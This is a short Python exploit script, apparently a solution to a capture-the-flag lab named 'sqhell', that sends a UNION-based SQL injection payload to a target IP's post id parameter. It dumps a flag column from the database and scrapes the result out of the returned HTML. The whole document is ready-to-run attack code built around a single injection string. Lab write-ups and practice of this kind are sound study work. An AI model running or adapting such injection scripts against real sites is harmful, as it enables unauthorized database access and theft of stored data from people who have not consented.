#!/usr/bin/env python3

#This script dumps the flag from a MySQL database via UNION SQL injection

import requests
from bs4 import BeautifulSoup
import argparse

parser = argparse.ArgumentParser(description='Flag 5 Auto-Pwn')
parser.add_argument('-i', help='Target IP Address (Eg: "10.10.10.10")', required=True)
args = parser.parse_args()

IP = args.i

injection = "-1 union all select 1,2,group_concat(flag),4 from sqhell_5.flag-- -"
url = "http://" + IP + "/post?id=1" + injection
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
r = requests.get(url, headers = headers)

html = r.text
soup = BeautifulSoup(html, 'html.parser')
match = soup.find("div", class_="panel-body")
flag = match.text

print(flag.strip())